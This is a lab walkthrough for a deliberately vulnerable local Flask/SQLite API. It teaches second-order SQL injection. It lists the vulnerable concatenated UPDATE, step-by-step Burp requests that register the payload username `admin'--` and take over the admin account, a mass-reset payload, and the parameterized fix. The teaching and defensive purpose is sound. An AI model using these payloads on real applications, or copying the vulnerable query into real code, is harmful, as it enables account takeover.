# Walkthrough — sqli-second-order

## 1. Context

The app has two flows that share one `users` table in SQLite.

- **Registration** — `POST /register` with `{"username": ..., "password": ...}` — inserts a new user. The username goes in through a **parameterized query**: the SQL text keeps a `?` **placeholder** and the value is handed to the driver separately, so the value can never be read as SQL. A payload in the username is stored as a literal string; nothing executes.
- **Change password** — `POST /change-password` with `{"new_password": ...}` — is authenticated. It looks up the **logged-in user's own username** from the database and builds an `UPDATE` to set that user's password.

A minimal `POST /login` ties them together: it authenticates `{"username", "password"}` and hands back a signed session cookie so change-password knows who you are.

This is **second-order SQL injection** (also called *stored SQL injection*), under **A03 — Injection** on the OWASP Top 10. A few terms, because the whole lesson lives in them:

- In **first-order** (or *in-band*) SQL injection — the kind in [`sqli-union-basic`](../sqli-union-basic/) — untrusted input is concatenated into a query and detonates in the **same** request. The **source** (where the untrusted value enters) and the **sink** (where it becomes SQL) are the same request.
- In **second-order**, the value is stored by one safe request and detonates **later**, in a **different** request, when the app reads it back and concatenates it. The source is now a **read from the database**, not the HTTP request in front of you.
- A **trust boundary** is the line between untrusted input (what came from outside) and data the code treats as trusted-internal. This bug is the app re-assuming trust in a value *just because it came from its own database* — but that value entered as attacker input at registration, and **every read from the database is untrusted input again**.
- **Stacked queries** (multiple statements in one call, like `...; DROP TABLE users`) are *not* what this atom uses — `sqlite3`'s `execute()` rejects them outright. The payload subverts the `WHERE` of a single statement.

Topology: `vulnerable` on `127.0.0.1:8029` and `fixed` on `127.0.0.1:8129`, each a self-contained Flask + SQLite container. This is an **API — there is no browser track.** Every request below is a block you paste into **Burp Repeater**; the proof is a login response. One operational note: this lab **writes** to its database, and the exploit changes a seeded account's password, so **to re-run from a clean slate, `./atom down sqli-second-order && ./atom up sqli-second-order`** — the database is ephemeral and reseeds on a fresh container.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). Registration is safe — look at it first, because the whole point is that attacking it does nothing:

```python
@app.route("/register", methods=["POST"])
def register():
    ...
    # SAFE (parameterized): even a SQL payload in `username` is stored as a literal VALUE.
    conn.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
```

Now the second flow:

```python
@app.route("/change-password", methods=["POST"])
def change_password():
    uid = session.get("uid")
    ...
    # The logged-in user's username is READ BACK from the DB (parameterized read).
    uname = conn.execute("SELECT username FROM users WHERE id = ?", (uid,)).fetchone()["username"]
    # VULNERABLE: the username re-read from the DB is concatenated straight into the UPDATE...
    query = f"UPDATE users SET password = ? WHERE username = '{uname}'"
    conn.execute(query, (new_password,))
```

Look closely at that `UPDATE`. There are two values in it, treated in **opposite** ways. `new_password` — fresh input from *this* request — goes through a `?` placeholder: safe. `uname` — read back from the database — is pasted into the SQL string with an f-string: not safe. The developer parameterized the input they were thinking about (the new password) and concatenated the one they assumed was trustworthy (a username already in the database). Ask the auditor's question: *the username I chose at registration is re-read here and pasted into SQL — what if I register a username that is itself a payload?*

Nothing in the *entry points* helps an attacker directly: `register` and `login` are both parameterized. A classic first-order probe against the login finds nothing —

```
POST /login HTTP/1.1
Host: 127.0.0.1:8029
Content-Type: application/json

{"username": "admin' OR '1'='1", "password": "x"}
```

— returns `401 {"authenticated": false}`. The entry points test as safe. The bomb has to be planted through the safe door and detonated by the second flow.

## 3. Exploitation via Burp Suite

Point Burp at the vulnerable API on `127.0.0.1:8029` and work from Repeater. The chain is register → login → change-password, so you carry the session cookie from the login response into the change-password request.

**The session cookie.** `POST /login` responds with `Set-Cookie: session=...` — a Flask signed cookie. Copy that whole `session=...` value into a `Cookie:` header on your change-password request. (Base64-decoding its first segment shows `{"uid": 5}` — your *own* account's id; the number depends on how many users you registered first. change-password reads that id from the session, never from the request body, so you can only act as yourself — the payload does the work, not a chosen target.) With `curl`, a cookie jar handles this for you: `curl -c jar -b jar ...`.

### Baseline — the second flow working normally

Register a normal user, log in, change its password. Only *its* row is touched:

```
POST /register HTTP/1.1
Host: 127.0.0.1:8029
Content-Type: application/json

{"username": "normaluser", "password": "normalpw"}
```
→ `200 {"registered": true}`. Then `POST /login` with the same body captures the cookie, and:

```
POST /change-password HTTP/1.1
Host: 127.0.0.1:8029
Content-Type: application/json
Cookie: session=<from the login response>

{"new_password": "baseline123"}
```
→ `200 {"updated": true}`. Now `normaluser` authenticates with `baseline123`, and — the point — `admin` is untouched: `{"username": "admin", "password": "admin-lab-pw"}` still returns `200 {"authenticated": true}`. A normal username changes only its own row.

### Time 1 — plant the payload (inert)

Register a user whose **username is a SQL payload**:

```
POST /register HTTP/1.1
Host: 127.0.0.1:8029
Content-Type: application/json

{"username": "admin'--", "password": "attackerpw"}
```

Response — `200`:

```json
{"registered": true}
```

Nothing happened to anyone. The parameterized `INSERT` stored `admin'--` as a literal username (it is a distinct string from `admin`, so the `UNIQUE` constraint is fine). Prove the plant was inert — `admin` still has its original password:

```
POST /login   {"username": "admin", "password": "admin-lab-pw"}
```
→ `200 {"authenticated": true}`. **This is the crux: attacking the registration directly does nothing.** The danger is not the write — it is the later read.

### Time 2 — detonate through the second flow

Log in as the payload user (its own real password), capture the cookie, then call change-password:

```
POST /login   {"username": "admin'--", "password": "attackerpw"}
```
→ `200 {"authenticated": true}` with `Set-Cookie: session=...`. Carry that cookie:

```
POST /change-password HTTP/1.1
Host: 127.0.0.1:8029
Content-Type: application/json
Cookie: session=<from the login response>

{"new_password": "pwned123"}
```

Response — `200`:

```json
{"updated": true}
```

The server re-read your username (`admin'--`) and pasted it into the `UPDATE`. The query it actually ran was:

```sql
UPDATE users SET password = ? WHERE username = 'admin'--'
```

Your username's trailing `'--` closed the string literal early and commented out the rest of the line, so the effective statement is `UPDATE users SET password = 'pwned123' WHERE username = 'admin'`. The `UPDATE` that should have changed *your* password was **redirected to `admin`'s row**.

### Time 3 — the proof (account takeover)

The change-password response told you nothing (`updated: true` either way). The proof is a login: `admin`'s password is now `pwned123`.

```
POST /login   {"username": "admin", "password": "pwned123"}
```
→ `200 {"authenticated": true}` — **you have taken over `admin`.** And the original password is dead: `{"username": "admin", "password": "admin-lab-pw"}` now returns `401 {"authenticated": false}`.

The effect is **surgical**, and you can confirm it directly against the container's database:

```
$ docker exec -i sqli-second-order-vulnerable-1 python3 - <<'PY'
import sqlite3
c = sqlite3.connect("lab.db"); c.row_factory = sqlite3.Row
for r in c.execute("SELECT id, username, password FROM users ORDER BY id"):
    print(r["id"], repr(r["username"]), repr(r["password"]))
PY
1 'admin'      'pwned123'      # ← taken over
...
5 "admin'--"   'attackerpw'    # ← the attacker's OWN row, untouched
```

`admin` changed; the attacker's own row did **not**. The `UPDATE` was redirected entirely, not applied broadly. The lab is isolated — both apps bind only to `127.0.0.1`, the database is fake and ephemeral — and the payload is benign: it subverts one `UPDATE` on a fake password to prove the redirect, running no stacked or destructive statements.

## 4. What the vuln is NOT

The exploit is a legitimate-looking username and two ordinary requests, so it is easy to draw the wrong lesson. Kill the wrong conclusions.

**It is not a bug in registration / the write.** The `INSERT` is parameterized and correct; the payload is stored as inert text. You saw this in Time 1 — attacking `/register` directly changes nothing. The write was never the problem.

**It is not "sanitize the input at the entry point."** The instinct is "validate the `username` at registration — forbid quotes and `--`." That is a blocklist in the wrong place: it chases the *shape* of the payload (encodings, other characters, other code paths that write to the table) and leaves the real bug — the second query concatenates — untouched. Parameterizing or sanitizing at the *entry* does not travel with the value to the *point of use*. The fix is to parameterize the second query (§6).

**It is not first-order SQL injection (`sqli-union-basic`).** There, the payload detonates in the same request that carries it. Here it does not: a first-order probe against the entry points finds nothing (you saw `{"username": "admin' OR '1'='1", ...}` return `401` in §2). The payload lies dormant in the database and detonates only when the *second* flow reads it back — a different request, a different query.

**It is not RCE.** It subverts a query to change data it should not; nothing runs code.

**The isolation proof.** A *normal* username runs through both flows with nothing escaping, on **both** ports — you saw the baseline leave `admin` untouched. Only the payload username, on the vulnerable app, redirects the `UPDATE`. On the fixed app (§6), not even it does.

## 5. Impact

Query subversion in the second flow → **account takeover**: the attacker changes another account's password and logs in as it, gaining whatever that account can reach in the victim's context. The ceiling is whatever the second query permits — here a redirected `UPDATE`, so a targeted takeover with `admin'--`, or a mass password reset with a payload like `x' OR '1'='1` (which matches every row). It is not RCE, and it is not an unbounded dump. Second-order SQL injection has other faces in the wild — a re-read value flowing into a `SELECT` or `INSERT` instead — but this atom models the takeover-via-`UPDATE` face and claims no more.

## 6. Why the fix works

Run the same chain against the fixed API on port **8129** (see [`DIFF.md`](./DIFF.md) for the change). Register `admin'--`, log in, and call change-password with `{"new_password": "pwned123"}` exactly as before. The takeover fails:

```
POST /login   {"username": "admin", "password": "pwned123"}
```
→ `401 {"authenticated": false}` — `admin`'s password did **not** change. And `admin` with its original password still works:

```
POST /login   {"username": "admin", "password": "admin-lab-pw"}
```
→ `200 {"authenticated": true}`.

The fixed change-password binds the re-read username as a parameter:

```python
conn.execute("UPDATE users SET password = ? WHERE username = ?", (new_password, uname))
```

Now `admin'--` is matched as a **literal value**, so the `UPDATE` hits only the row whose username is exactly `admin'--` — the attacker's *own* row. The database confirms it: on 8129, `admin` keeps `admin-lab-pw` and the attacker's own row (`admin'--`) becomes `pwned123` — change-password did exactly what it should, changing *your* password and no one else's.

The feature is identical on both ports; the baseline (a normal user changing its own password) behaves the same. Only the payload separates them. And the fix is specifically to **parameterize the second query** — it does not sanitize or validate the username at registration (the registration was always safe), because the lesson is that **every read from the database is untrusted input again**, and the place to treat it as data is the query that uses it. [`DIFF.md`](./DIFF.md) walks through why the "I already parameterized registration" and "just sanitize the username" reflexes are the wrong shape.
